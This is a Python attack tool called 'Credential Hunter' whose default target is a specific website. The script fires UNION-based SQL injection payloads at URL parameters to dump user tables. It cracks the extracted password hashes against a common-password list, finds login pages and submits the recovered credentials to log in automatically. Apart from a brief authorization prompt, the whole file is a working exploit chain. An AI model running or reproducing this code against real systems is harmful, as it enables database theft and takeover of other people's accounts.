#!/usr/bin/env python3
"""
Yamersal Credential Hunter v3.5
Advanced Credential Extraction & Auto Login Testing
Author: Security Researcher
Version: 3.5 - Auto Login System Added
"""

import requests
import json
import urllib.parse
import re
import time
import sys
import os
import hashlib
import binascii
import base64
import threading
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

class AdvancedHashCracker:
    def __init__(self):
        self.hash_types = {
            'md5': {'pattern': r'^[a-fA-F0-9]{32}$', 'function': hashlib.md5},
            'sha1': {'pattern': r'^[a-fA-F0-9]{40}$', 'function': hashlib.sha1},
            'sha256': {'pattern': r'^[a-fA-F0-9]{64}$', 'function': hashlib.sha256},
            'sha512': {'pattern': r'^[a-fA-F0-9]{128}$', 'function': hashlib.sha512},
            'mysql5': {'pattern': r'^\*[a-fA-F0-9]{40}$', 'function': None},
            'mysql': {'pattern': r'^[a-fA-F0-9]{16}$', 'function': None},
        }
        
        self.wordlists = [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt',
            'wordlists/common_passwords.txt',
        ]

    def identify_hash_type(self, hash_string):
        """Identify the type of hash"""
        hash_string = hash_string.strip()
        
        for hash_type, info in self.hash_types.items():
            if re.match(info['pattern'], hash_string):
                return hash_type
        
        if hash_string.startswith('$P$') or hash_string.startswith('$H$'):
            return 'wordpress'
        
        if hash_string.startswith('$2a$') or hash_string.startswith('$2b$'):
            return 'bcrypt'
        
        return 'unknown'

    def crack_hash(self, hash_string):
        """Crack hash using common passwords"""
        hash_type = self.identify_hash_type(hash_string)
        
        common_passwords = [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'admin', 'welcome', 'monkey', 'password1',
            '1234567890', 'abcd1234', 'sunshine', 'princess', 'qwertyuiop',
            'letmein', '123abc', 'admin123', 'welcome123', 'password123',
            'test', 'guest', 'root', 'pass', 'pass123', 'admin@123',
            '123456a', '123456789a', '123', '1', 'password@123'
        ]
        
        for password in common_passwords:
            if self.verify_hash(password, hash_string, hash_type):
                return password, hash_type
        
        return None, hash_type

    def verify_hash(self, password, hash_string, hash_type):
        """Verify if password matches hash"""
        try:
            if hash_type in self.hash_types and self.hash_types[hash_type]['function']:
                hash_obj = self.hash_types[hash_type]['function']()
                hash_obj.update(password.encode('utf-8'))
                return hash_obj.hexdigest() == hash_string.lower()
        except:
            pass
        return False

class LoginTester:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive'
        })

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def discover_login_pages(self):
        """Discover common login pages"""
        login_paths = [
            '/admin', '/login', '/wp-login.php', '/administrator',
            '/user/login', '/auth/login', '/signin', '/admin/login',
            '/dashboard', '/controlpanel', '/cp', '/admincp'
        ]
        
        found_login_pages = []
        
        for path in login_paths:
            try:
                url = f"{self.target}{path}"
                response = self.session.get(url, timeout=8, allow_redirects=False)
                
                # Check if it's a login page
                if response.status_code in [200, 301, 302]:
                    content_lower = response.text.lower()
                    login_indicators = [
                        'login', 'sign in', 'username', 'password', 
                        'log in', 'user name', 'pass word', 'wp-admin'
                    ]
                    
                    if any(indicator in content_lower for indicator in login_indicators):
                        found_login_pages.append({
                            'url': url,
                            'path': path,
                            'status': response.status_code,
                            'title': self.extract_title(response.text)
                        })
                        self.print_status(f"✅ Login page found: {path}", "SUCCESS")
                        
            except Exception as e:
                continue
        
        return found_login_pages

    def extract_title(self, html):
        """Extract page title from HTML"""
        title_match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE)
        if title_match:
            return title_match.group(1).strip()[:50]
        return "No title"

    def analyze_login_form(self, login_url):
        """Analyze login form to find input fields"""
        try:
            response = self.session.get(login_url, timeout=10)
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            form_data = {
                'url': login_url,
                'forms': []
            }
            
            for i, form in enumerate(forms):
                form_info = {
                    'action': self.extract_form_action(form, login_url),
                    'method': self.extract_form_method(form),
                    'inputs': self.extract_form_inputs(form),
                    'has_username': False,
                    'has_password': False
                }
                
                # Check for username and password fields
                for input_field in form_info['inputs']:
                    if any(name in input_field.get('name', '').lower() for name in ['user', 'login', 'email', 'username']):
                        form_info['has_username'] = True
                    if any(name in input_field.get('name', '').lower() for name in ['pass', 'password']):
                        form_info['has_password'] = True
                
                if form_info['has_username'] and form_info['has_password']:
                    form_info['likely_login'] = True
                    form_data['forms'].append(form_info)
                    self.print_status(f"   🔍 Login form found (Method: {form_info['method']})", "INFO")
            
            return form_data
            
        except Exception as e:
            return None

    def extract_form_action(self, form_html, base_url):
        """Extract form action URL"""
        action_match = re.search(r'action=[\'"]([^\'"]*)[\'"]', form_html, re.IGNORECASE)
        if action_match:
            action = action_match.group(1)
            if action.startswith('http'):
                return action
            else:
                return urllib.parse.urljoin(base_url, action)
        return base_url

    def extract_form_method(self, form_html):
        """Extract form method"""
        method_match = re.search(r'method=[\'"]([^\'"]*)[\'"]', form_html, re.IGNORECASE)
        return method_match.group(1).upper() if method_match else 'POST'

    def extract_form_inputs(self, form_html):
        """Extract form input fields"""
        inputs = []
        input_pattern = r'<input[^>]*>'
        
        for input_tag in re.findall(input_pattern, form_html, re.IGNORECASE):
            input_data = {}
            
            # Extract name
            name_match = re.search(r'name=[\'"]([^\'"]*)[\'"]', input_tag)
            if name_match:
                input_data['name'] = name_match.group(1)
            
            # Extract type
            type_match = re.search(r'type=[\'"]([^\'"]*)[\'"]', input_tag)
            if type_match:
                input_data['type'] = type_match.group(1)
            else:
                input_data['type'] = 'text'
            
            # Extract value
            value_match = re.search(r'value=[\'"]([^\'"]*)[\'"]', input_tag)
            if value_match:
                input_data['value'] = value_match.group(1)
            
            if input_data.get('name'):
                inputs.append(input_data)
        
        return inputs

    def test_login(self, login_url, form_data, username, password):
        """Test login with credentials"""
        try:
            form_info = form_data['forms'][0]  # Use first likely login form
            
            # Prepare form data
            post_data = {}
            for input_field in form_info['inputs']:
                field_name = input_field.get('name', '')
                field_type = input_field.get('type', 'text')
                
                if any(name in field_name.lower() for name in ['user', 'login', 'email', 'username']):
                    post_data[field_name] = username
                elif any(name in field_name.lower() for name in ['pass', 'password']):
                    post_data[field_name] = password
                else:
                    # Keep hidden fields and other inputs
                    post_data[field_name] = input_field.get('value', '')
            
            # Send login request
            if form_info['method'] == 'POST':
                response = self.session.post(
                    form_info['action'],
                    data=post_data,
                    timeout=15,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    form_info['action'],
                    params=post_data,
                    timeout=15,
                    allow_redirects=True
                )
            
            # Check if login was successful
            success = self.check_login_success(response, username)
            
            return {
                'success': success,
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'redirect_url': response.url,
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'success': False,
                'username': username,
                'password': password,
                'error': str(e)
            }

    def check_login_success(self, response, username):
        """Check if login was successful"""
        content_lower = response.text.lower()
        
        # Indicators of successful login
        success_indicators = [
            f'welcome {username}',
            'dashboard',
            'logout',
            'admin panel',
            'my account',
            'successful login',
            'logged in'
        ]
        
        # Indicators of failed login
        failure_indicators = [
            'invalid',
            'incorrect',
            'error',
            'failed',
            'wrong',
            'try again'
        ]
        
        # Check for success indicators
        for indicator in success_indicators:
            if indicator in content_lower:
                return True
        
        # Check for failure indicators
        for indicator in failure_indicators:
            if indicator in content_lower:
                return False
        
        # If redirected to different page, might be success
        if response.url and 'login' not in response.url.lower():
            return True
        
        return False

    def test_credentials_on_all_pages(self, credentials):
        """Test credentials on all discovered login pages"""
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("🔐 AUTO LOGIN TESTING STARTED", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        # Discover login pages
        login_pages = self.discover_login_pages()
        
        if not login_pages:
            self.print_status("❌ No login pages found for testing", "ERROR")
            return []
        
        successful_logins = []
        
        for login_page in login_pages:
            self.print_status(f"\n🎯 Testing login page: {login_page['path']}", "INFO")
            self.print_status(f"🔗 URL: {login_page['url']}", "INFO")
            
            # Analyze login form
            form_data = self.analyze_login_form(login_page['url'])
            
            if not form_data or not form_data['forms']:
                self.print_status("   ❌ No login form found", "WARNING")
                continue
            
            # Test each credential
            for cred in credentials:
                if cred.get('password'):
                    self.print_status(f"   🔑 Testing: {cred['username']} / {cred['password']}", "INFO")
                    
                    result = self.test_login(
                        login_page['url'], 
                        form_data, 
                        cred['username'], 
                        cred['password']
                    )
                    
                    if result['success']:
                        self.print_status(f"   ✅ LOGIN SUCCESS: {cred['username']} / {cred['password']}", "CRITICAL")
                        successful_logins.append({
                            'login_page': login_page['url'],
                            'username': cred['username'],
                            'password': cred['password'],
                            'redirect_url': result.get('redirect_url', ''),
                            'source': cred.get('source', 'SQL Injection')
                        })
                    else:
                        self.print_status(f"   ❌ Login failed", "WARNING")
        
        return successful_logins

class CredentialHunter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target
        self.session = requests.Session()
        self.hash_cracker = AdvancedHashCracker()
        self.login_tester = LoginTester(target)
        self.credentials_found = []
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def test_connection(self):
        """Test if target is accessible"""
        try:
            response = self.session.get(self.target, timeout=10)
            if response.status_code == 200:
                self.print_status(f"Target is accessible: {self.target}", "SUCCESS")
                return True
            else:
                self.print_status(f"Target responded with status: {response.status_code}", "WARNING")
                return True
        except Exception as e:
            self.print_status(f"Target is not accessible: {e}", "ERROR")
            return False

    def extract_from_sql_injection(self):
        """Extract credentials using SQL Injection"""
        self.print_status("Attempting SQL Injection credential extraction...", "INFO")
        
        sql_payloads = [
            "' UNION SELECT user_login,user_pass,user_email FROM wp_users--",
            "' UNION SELECT username,password,email FROM users--", 
            "' UNION SELECT username,password,email FROM admin_users--",
            "' UNION SELECT user,pass,email FROM members--",
        ]
        
        parameters = ['id', 'page', 'file', 'path', 'view']
        found_credentials = []
        raw_credentials = []  # Store username/password pairs for login testing
        
        for param in parameters:
            self.print_status(f"Testing parameter: {param}", "INFO")
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        if any(indicator in content.lower() for indicator in ['admin', 'user', 'password', 'email']):
                            
                            credential_data = {
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'findings': [],
                                'credentials': []  # Store username/password pairs
                            }
                            
                            # Extract usernames and passwords
                            self.extract_credential_pairs(content, credential_data, raw_credentials)
                            
                            if credential_data['findings']:
                                found_credentials.append(credential_data)
                                self.print_status(f"   🔗 URL: {test_url}", "INFO")
                                
                except Exception as e:
                    continue
        
        # Display results
        if found_credentials:
            self.display_sql_results(found_credentials)
        
        return found_credentials, raw_credentials

    def extract_credential_pairs(self, content, credential_data, raw_credentials):
        """Extract username/password pairs from content"""
        # Pattern for finding username:password or username - password patterns
        patterns = [
            r'([a-zA-Z0-9_@\.-]{3,50})[:\s\-]+([a-fA-F0-9]{16,128})',
            r'username[^<>\n]*?([a-zA-Z0-9_@\.-]{3,50})[^<>\n]*?password[^<>\n]*?([a-fA-F0-9]{16,128})',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for username, password_hash in matches:
                if len(username) > 2 and len(password_hash) >= 16:
                    # Crack the hash
                    cracked_password, hash_type = self.hash_cracker.crack_hash(password_hash)
                    
                    if cracked_password:
                        credential_pair = {
                            'username': username,
                            'password': cracked_password,
                            'hash': password_hash,
                            'type': hash_type,
                            'source': 'SQL Injection'
                        }
                        
                        credential_data['credentials'].append(credential_pair)
                        raw_credentials.append(credential_pair)
                        
                        credential_data['findings'].append(f"Credentials: {username} / {cracked_password}")
                        self.print_status(f"   ✅ Found credentials: {username} / {cracked_password}", "SUCCESS")

    def display_sql_results(self, found_credentials):
        """Display SQL injection results"""
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("🎯 SQL INJECTION CREDENTIALS SUMMARY", "SUCCESS")
        self.print_status("="*80, "INFO")
        
        all_credentials = []
        
        for i, cred in enumerate(found_credentials, 1):
            self.print_status(f"\n[{i}] Parameter: {cred['parameter']}", "INFO")
            self.print_status(f"    URL: {cred['url']}", "INFO")
            
            for finding in cred['findings']:
                if "Credentials:" in finding:
                    self.print_status(f"    🔓 {finding}", "CRITICAL")
                    all_credentials.extend(cred['credentials'])
        
        return all_credentials

    def run_comprehensive_scan(self):
        """Run comprehensive scan with auto login testing"""
        self.print_status("Starting advanced credential extraction scan...", "CRITICAL")
        
        if not self.test_connection():
            return
        
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("🚀 ADVANCED CREDENTIAL HUNTING SCAN STARTED", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        # Extract credentials via SQL injection
        sql_results, raw_credentials = self.extract_from_sql_injection()
        
        # Test credentials on login pages
        if raw_credentials:
            successful_logins = self.login_tester.test_credentials_on_all_pages(raw_credentials)
            
            # Display login results
            self.display_login_results(successful_logins)
        else:
            self.print_status("\n❌ No credentials found for login testing", "WARNING")
        
        # Final summary
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("📊 SCAN COMPLETED - FINAL SUMMARY", "SUCCESS")
        self.print_status("="*80, "INFO")
        
        total_credentials = len(raw_credentials)
        successful_count = len(successful_logins) if 'successful_logins' in locals() else 0
        
        self.print_status(f"🔓 CREDENTIALS EXTRACTED: {total_credentials}", "SUCCESS")
        self.print_status(f"✅ SUCCESSFUL LOGINS: {successful_count}", "CRITICAL" if successful_count > 0 else "SUCCESS")
        
        if successful_count > 0:
            self.print_status(f"🎉 SUCCESS! {successful_count} valid credentials found!", "CRITICAL")
        else:
            self.print_status("🔐 No successful logins achieved", "WARNING")

    def display_login_results(self, successful_logins):
        """Display successful login results"""
        if successful_logins:
            self.print_status("\n" + "="*80, "INFO")
            self.print_status("🎉 SUCCESSFUL LOGIN CREDENTIALS", "CRITICAL")
            self.print_status("="*80, "INFO")
            
            for i, login in enumerate(successful_logins, 1):
                self.print_status(f"\n[{i}] ✅ SUCCESSFUL LOGIN", "CRITICAL")
                self.print_status(f"    👤 Username: {login['username']}", "SUCCESS")
                self.print_status(f"    🔑 Password: {login['password']}", "CRITICAL")
                self.print_status(f"    🌐 Login Page: {login['login_page']}", "INFO")
                self.print_status(f"    🔗 Redirected to: {login['redirect_url']}", "INFO")
                self.print_status(f"    📍 Source: {login['source']}", "INFO")

def main():
    """Main function"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                         CREDENTIAL HUNTER v3.5                              ║
║           Advanced Credential Extraction & Auto Login Testing              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("Enter target URL (default: https://yamersal.com): ").strip()
        if not target:
            target = "https://yamersal.com"
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(f"\n⚠️  LEGAL DISCLAIMER: This tool is for authorized penetration testing only!")
    print(f"⚠️  Unauthorized use may be illegal in your jurisdiction!")
    print(f"⚠️  Use only on systems you own or have explicit permission to test!\n")
    
    confirm = input("Do you have authorization to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled. Exiting...")
        sys.exit(0)
    
    try:
        hunter = CredentialHunter(target)
        hunter.run_comprehensive_scan()
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user. Exiting...")
    except Exception as e:
        print(f"\nScan failed with error: {e}")

if __name__ == "__main__":
    main()